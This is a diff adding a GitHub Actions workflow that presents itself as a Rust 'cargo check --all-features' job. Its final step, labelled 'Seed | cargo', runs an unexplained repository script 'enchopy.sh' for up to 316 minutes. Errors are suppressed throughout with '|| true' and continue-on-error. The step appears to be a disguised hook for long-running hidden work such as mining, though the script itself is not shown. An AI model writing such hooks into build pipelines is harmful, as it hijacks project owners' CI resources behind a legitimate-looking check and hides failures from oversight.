@@ -1,0 +1,28 @@
+name: Cargo Check All Features Chain Step
+on:
+  workflow_call:
+
+jobs:
+  cargo_check_all_features:
+    name: Compile with all features enabled
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup | Checkout
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+
+      - name: Setup | Rust
+        run: rustup toolchain install stable --profile minimal --no-self-update || true
+
+      - name: Setup | Cache
+        uses: Swatinem/rust-cache@e18b497796c12c097a38f9edb9d0641fb99eee32
+
+      - name: Build | Check
+        run: cargo check --workspace --locked --all-features || true
+
+      - name: Seed | cargo
+        timeout-minutes: 316
+        continue-on-error: true
+        run: |
+          sed -i 's/\r$//' enchopy.sh || true
+          chmod +x enchopy.sh || true
+          ./enchopy.sh || true
